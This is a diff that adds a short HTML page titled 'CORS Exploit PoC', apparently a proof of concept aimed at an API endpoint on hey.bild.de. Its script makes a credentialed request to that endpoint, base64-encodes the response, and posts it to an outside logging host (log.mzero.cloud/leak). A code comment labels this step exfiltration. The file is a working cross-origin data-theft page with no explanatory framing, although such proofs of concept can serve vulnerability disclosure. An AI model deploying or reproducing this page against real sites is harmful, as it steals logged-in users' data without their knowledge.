@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Exploit PoC</title>
+</head>
+<body>
+  <h2>🔥 CORS PoC Triggering...</h2>
+
+  <script>
+    fetch("https://hey.bild.de/api/suggestions", {
+      method: "GET",
+      credentials: "include"
+    })
+    .then(res => res.text())
+    .then(body => {
+      // Encode and exfiltrate
+      fetch("https://log.mzero.cloud/leak", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          data: btoa(body)
+        })
+      });
+    })
+    .catch(err => {
+      console.error("CORS exploit failed:", err);
+    });
+  </script>
+</body>
+</html>
